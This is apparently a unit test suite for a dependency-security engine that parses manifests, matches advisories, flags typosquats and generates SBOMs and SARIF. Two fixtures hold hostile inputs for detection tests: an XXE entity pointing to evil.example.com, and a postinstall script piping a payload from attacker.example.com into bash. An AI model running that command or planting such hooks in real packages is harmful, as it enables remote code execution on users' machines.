/**
 * packages/dependency-engine/__tests__/engine.test.js
 *
 * Comprehensive Unit Test Suite for Dependency Intelligence Engine.
 * Tests:
 * - Semver range evaluation, caret/tilde, logical OR, pre-releases
 * - Manifest parsers across npm, pypi, go, cargo, maven
 * - Direct vs transitive graph resolution
 * - Reachability evaluation
 * - License classification and policy
 * - Typosquatting heuristics & suspicious scripts
 * - Advisory matching with evidence
 * - SBOM generation (CycloneDX, SPDX, JSON)
 * - Safe update diff patch generation
 * - SARIF 2.1.0 output
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import {
  parseVersion,
  compareVersions,
  satisfiesRange,
  isVersionVulnerable,
  findRecommendedFixedVersion,
} from '../src/semver/index.js';

import {
  parsePackageJson,
  parsePackageLockJson,
  parseRequirementsTxt,
  parseGoMod,
  parseCargoToml,
  parsePomXml,
} from '../src/manifests/index.js';

import { buildDependencyGraph, formatAsciiDependencyTree } from '../src/graph/index.js';
import { extractImportedPackagesFromSources, assessReachability } from '../src/reachability/index.js';
import { classifyLicense, evaluateLicensePolicy, LICENSE_CLASSIFICATION } from '../src/licenses/index.js';
import { detectTyposquatting, analyzePackageHeuristics } from '../src/heuristics/index.js';
import { matchDependencyVulnerabilities, VulnerabilityProvider } from '../src/advisories/index.js';
import { generateCycloneDxSbom, generateSpdxSbom, generateNativeJsonSbom } from '../src/sbom/index.js';
import { proposeDependencyUpdate } from '../src/patches/index.js';
import { analyzePullRequestDependencies } from '../src/pr/index.js';
import { generateDependencySarif } from '../src/sarif/index.js';

describe('Dependency Engine — Semver & Range Evaluation', () => {
  it('should parse standard semver, prereleases, and build metadata', () => {
    const v = parseVersion('v1.2.3-beta.1+build.42');
    assert.equal(v.major, 1);
    assert.equal(v.minor, 2);
    assert.equal(v.patch, 3);
    assert.equal(v.prerelease, 'beta.1');
  });

  it('should compare versions accurately including prereleases', () => {
    assert.equal(compareVersions('1.2.3', '1.2.3'), 0);
    assert.equal(compareVersions('1.2.4', '1.2.3'), 1);
    assert.equal(compareVersions('1.2.2', '1.2.3'), -1);
    assert.equal(compareVersions('2.0.0', '1.9.9'), 1);
    // Prerelease is lower than release
    assert.equal(compareVersions('1.0.0-alpha', '1.0.0'), -1);
    assert.equal(compareVersions('1.0.0-beta', '1.0.0-alpha'), 1);
  });

  it('should satisfy caret, tilde, and compound ranges', () => {
    assert.equal(satisfiesRange('1.2.5', '^1.2.0'), true);
    assert.equal(satisfiesRange('2.0.0', '^1.2.0'), false);
    assert.equal(satisfiesRange('1.2.9', '~1.2.0'), true);
    assert.equal(satisfiesRange('1.3.0', '~1.2.0'), false);
    assert.equal(satisfiesRange('4.17.15', '<4.17.21'), true);
    assert.equal(satisfiesRange('4.17.21', '<4.17.21'), false);
    assert.equal(satisfiesRange('3.2.0', '>=3.0.0 <3.3.8 || >=4.0.0 <5.0.9'), true);
    assert.equal(satisfiesRange('3.3.8', '>=3.0.0 <3.3.8 || >=4.0.0 <5.0.9'), false);
    assert.equal(satisfiesRange('4.5.0', '>=3.0.0 <3.3.8 || >=4.0.0 <5.0.9'), true);
  });

  it('should find recommended fixed version', () => {
    const fixed = findRecommendedFixedVersion('4.17.19', ['4.17.21', '5.0.0']);
    assert.equal(fixed, '4.17.21');
  });
});

describe('Dependency Engine — Manifest Parsers', () => {
  it('should parse package.json dependencies and devDependencies', () => {
    const content = JSON.stringify({
      dependencies: {
        lodash: '^4.17.20',
        express: '4.18.2'
      },
      devDependencies: {
        mocha: '^10.0.0'
      }
    });
    const parsed = parsePackageJson(content);
    assert.equal(parsed.length, 3);
    const lodash = parsed.find(p => p.name === 'lodash');
    assert.ok(lodash);
    assert.equal(lodash.isDirect, true);
    assert.equal(lodash.isDev, false);
  });

  it('should parse package-lock.json v2/v3 packages and resolve transitive trees', () => {
    const lockContent = JSON.stringify({
      packages: {
        '': {
          dependencies: { express: '^4.18.2' }
        },
        'node_modules/express': {
          version: '4.18.2',
          integrity: 'sha512-abc'
        },
        'node_modules/express/node_modules/qs': {
          version: '6.11.0',
          integrity: 'sha512-def'
        }
      }
    });
    const parsed = parsePackageLockJson(lockContent);
    assert.equal(parsed.length, 2);
    const qs = parsed.find(p => p.name === 'qs');
    assert.ok(qs);
    assert.equal(qs.isDirect, false);
    assert.deepEqual(qs.dependencyPath, ['express', 'qs']);
  });

  it('should parse requirements.txt for Python', () => {
    const content = `
# Core deps
requests==2.28.1
urllib3>=1.26.0
flask~=2.0.0
`;
    const parsed = parseRequirementsTxt(content);
    assert.equal(parsed.length, 3);
    assert.equal(parsed[0].name, 'requests');
    assert.equal(parsed[0].version, '2.28.1');
    assert.equal(parsed[0].ecosystem, 'pypi');
  });

  it('should parse go.mod for Golang', () => {
    const content = `
module test-app

go 1.20

require (
\tgithub.com/gin-gonic/gin v1.9.1
\tgolang.org/x/net v0.15.0 // indirect
)
`;
    const parsed = parseGoMod(content);
    assert.equal(parsed.length, 2);
    const net = parsed.find(p => p.name === 'golang.org/x/net');
    assert.ok(net);
    assert.equal(net.isDirect, false);
    assert.equal(net.version, '0.15.0');
  });

  it('should parse Cargo.toml for Rust', () => {
    const content = `
[package]
name = "my-crate"
version = "0.1.0"

[dependencies]
serde = "1.0.104"
tokio = { version = "1.28.0", features = ["full"] }
`;
    const parsed = parseCargoToml(content);
    assert.equal(parsed.length, 2);
    assert.equal(parsed[0].name, 'serde');
    assert.equal(parsed[0].version, '1.0.104');
    assert.equal(parsed[1].name, 'tokio');
    assert.equal(parsed[1].version, '1.28.0');
  });

  it('should safely parse pom.xml without XXE execution', () => {
    const xml = `
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.example.com">]>
<project>
  <dependencies>
    <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-core</artifactId>
      <version>2.14.1</version>
    </dependency>
  </dependencies>
</project>
`;
    const parsed = parsePomXml(xml);
    assert.equal(parsed.length, 1);
    assert.equal(parsed[0].name, 'org.apache.logging.log4j:log4j-core');
    assert.equal(parsed[0].version, '2.14.1');
  });
});

describe('Dependency Engine — Graph & Reachability', () => {
  it('should construct dependency graph and distinguish direct vs transitive', () => {
    const manifestDeps = [
      { name: 'express', version: '4.18.2', ecosystem: 'npm', isDirect: true, manifestPath: 'package.json' }
    ];
    const lockfileDeps = [
      { name: 'express', version: '4.18.2', ecosystem: 'npm', isDirect: true, dependencyPath: ['express'] },
      { name: 'qs', version: '6.11.0', ecosystem: 'npm', isDirect: false, dependencyPath: ['express', 'qs'] }
    ];

    const graph = buildDependencyGraph({ manifestDependencies: manifestDeps, lockfileDependencies: lockfileDeps });
    assert.equal(graph.totalDependencies, 2);
    assert.equal(graph.directCount, 1);
    assert.equal(graph.transitiveCount, 1);

    const ascii = formatAsciiDependencyTree(graph.tree);
    assert.ok(ascii.includes('express@4.18.2'));
    assert.ok(ascii.includes('qs@6.11.0'));
  });

  it('should assess reachability conservatively based on source code references', () => {
    const sourceFiles = [
      {
        path: 'src/index.js',
        content: `import express from 'express';\nconst app = express();`
      }
    ];
    const imports = extractImportedPackagesFromSources(sourceFiles);
    assert.ok(imports.has('express'));

    const depNode = {
      name: 'express',
      version: '4.18.2',
      isDirect: true,
      lockfilePath: 'package-lock.json',
      manifestPath: 'package.json'
    };
    const reach = assessReachability(depNode, imports);
    assert.equal(reach.status, 'POTENTIALLY_REACHABLE');
    assert.ok(reach.summary.includes('Dependency is installed and referenced'));

    const unimportedNode = {
      name: 'unused-pkg',
      version: '1.0.0',
      isDirect: true,
      lockfilePath: 'package-lock.json'
    };
    const reachUnused = assessReachability(unimportedNode, imports);
    assert.equal(reachUnused.status, 'INSTALLED');
  });
});

describe('Dependency Engine — Licenses & Policies', () => {
  it('should classify permissive, copyleft, weak copyleft, and missing licenses', () => {
    assert.equal(classifyLicense('MIT').classification, LICENSE_CLASSIFICATION.PERMISSIVE);
    assert.equal(classifyLicense('Apache-2.0').classification, LICENSE_CLASSIFICATION.PERMISSIVE);
    assert.equal(classifyLicense('GPL-3.0').classification, LICENSE_CLASSIFICATION.COPYLEFT);
    assert.equal(classifyLicense('LGPL-3.0').classification, LICENSE_CLASSIFICATION.WEAK_COPYLEFT);
    assert.equal(classifyLicense(null).classification, LICENSE_CLASSIFICATION.MISSING);
  });

  it('should evaluate license policy and emit factual review messages without legal claims', () => {
    const res = evaluateLicensePolicy('GPL-3.0');
    assert.equal(res.requiresReview, true);
    assert.ok(res.reason.includes('License requires review'));
    assert.ok(!res.reason.includes('illegal'));
  });
});

describe('Dependency Engine — Heuristics & Typosquatting', () => {
  it('should detect typosquatting candidates mimicking popular packages', () => {
    const r1 = detectTyposquatting('reactt', 'npm');
    assert.equal(r1.isTyposquatCandidate, true);
    assert.equal(r1.referencePackage, 'react');

    const r2 = detectTyposquatting('exxpress', 'npm');
    assert.equal(r2.isTyposquatCandidate, true);
    assert.equal(r2.referencePackage, 'express');

    // Exact genuine package should NOT be marked candidate
    const rGenuine = detectTyposquatting('lodash', 'npm');
    assert.equal(rGenuine.isTyposquatCandidate, false);
  });

  it('should flag suspicious lifecycle scripts as SUSPICIOUS_SIGNAL', () => {
    const pkg = {
      name: 'evil-test',
      scripts: {
        postinstall: 'curl -s http://attacker.example.com/payload.sh | bash'
      }
    };
    const signals = analyzePackageHeuristics(pkg);
    assert.equal(signals.length, 1);
    assert.equal(signals[0].status, 'SUSPICIOUS_SIGNAL');
    assert.ok(signals[0].summary.includes('suspicious command pattern'));
  });
});

describe('Dependency Engine — Vulnerability Matching & Advisories', () => {
  it('should match known advisory and produce evidence-backed finding', () => {
    const node = {
      name: 'lodash',
      version: '4.17.15',
      ecosystem: 'npm',
      isDirect: true,
      dependencyPath: ['application', 'lodash'],
      manifestPath: 'package.json'
    };
    const vulns = matchDependencyVulnerabilities(node);
    assert.equal(vulns.length, 1);
    assert.equal(vulns[0].category, 'DEPENDENCY_VULNERABILITY');
    assert.equal(vulns[0].advisoryId, 'GHSA-p6mc-m468-83gw');
    assert.equal(vulns[0].severity, 'HIGH');
    assert.equal(vulns[0].fixedVersion, '4.17.21');
    assert.ok(vulns[0].evidence.versionProof.includes('4.17.15 satisfies affected semver window'));
  });
});

describe('Dependency Engine — SBOM Generation (CycloneDX, SPDX, JSON)', () => {
  const dummyGraph = {
    rootName: 'test-app',
    totalDependencies: 1,
    nodes: [
      {
        name: 'lodash',
        version: '4.17.21',
        ecosystem: 'npm',
        isDirect: true,
        license: 'MIT',
        integrity: 'sha512-abc'
      }
    ]
  };

  it('should generate valid CycloneDX 1.5 JSON SBOM without secrets', () => {
    const sbom = generateCycloneDxSbom(dummyGraph, { appName: 'test-app' });
    assert.equal(sbom.bomFormat, 'CycloneDX');
    assert.equal(sbom.components.length, 1);
    assert.equal(sbom.components[0].purl, 'pkg:npm/lodash@4.17.21');
  });

  it('should generate valid SPDX 2.3 JSON SBOM', () => {
    const spdx = generateSpdxSbom(dummyGraph, { appName: 'test-app' });
    assert.equal(spdx.spdxVersion, 'SPDX-2.3');
    assert.equal(spdx.packages.length, 2); // root + lodash
  });

  it('should generate native JSON SBOM', () => {
    const json = generateNativeJsonSbom(dummyGraph);
    assert.equal(json.dependencies.length, 1);
  });
});

describe('Dependency Engine — Safe Update Patches & Diffs', () => {
  it('should propose dependency update and produce valid unified diff', () => {
    const original = `{\n  "dependencies": {\n    "lodash": "^4.17.15"\n  }\n}`;
    const patch = proposeDependencyUpdate({
      manifestPath: 'package.json',
      originalContent: original,
      packageName: 'lodash',
      currentVersion: '^4.17.15',
      proposedVersion: '^4.17.21'
    });

    assert.equal(patch.success, true);
    assert.ok(patch.diff.includes('-    "lodash": "^4.17.15"'));
    assert.ok(patch.diff.includes('+    "lodash": "^4.17.21"'));
  });
});

describe('Dependency Engine — PR Intelligence & SARIF', () => {
  it('should detect added, upgraded, and removed dependencies in PR', () => {
    const baseGraph = {
      nodes: [
        { name: 'lodash', version: '4.17.15', ecosystem: 'npm', isDirect: true },
        { name: 'old-dep', version: '1.0.0', ecosystem: 'npm', isDirect: true }
      ]
    };
    const headGraph = {
      nodes: [
        { name: 'lodash', version: '4.17.21', ecosystem: 'npm', isDirect: true },
        { name: 'new-dep', version: '2.0.0', ecosystem: 'npm', isDirect: true }
      ]
    };

    const diff = analyzePullRequestDependencies({ baseGraph, headGraph });
    assert.equal(diff.hasChanges, true);
    const upgraded = diff.dependencyChanges.find(c => c.changeType === 'UPGRADED_DEPENDENCY');
    assert.ok(upgraded);
    assert.equal(upgraded.package, 'lodash');

    const added = diff.dependencyChanges.find(c => c.changeType === 'NEW_DEPENDENCY');
    assert.ok(added);
    assert.equal(added.package, 'new-dep');

    const removed = diff.dependencyChanges.find(c => c.changeType === 'REMOVED_DEPENDENCY');
    assert.ok(removed);
    assert.equal(removed.package, 'old-dep');
  });

  it('should export SARIF 2.1.0 with dependency vulnerability rule definitions', () => {
    const findings = [
      {
        advisoryId: 'GHSA-test-1234',
        package: 'express',
        installedVersion: '4.16.0',
        fixedVersion: '4.18.2',
        affectedRange: '<4.18.0',
        severity: 'HIGH',
        summary: 'Test advisory'
      }
    ];
    const sarif = generateDependencySarif(findings);
    assert.equal(sarif.version, '2.1.0');
    assert.equal(sarif.runs[0].results.length, 1);
    assert.equal(sarif.runs[0].results[0].ruleId, 'GHSA-test-1234');
    assert.equal(sarif.runs[0].results[0].level, 'error');
  });
});
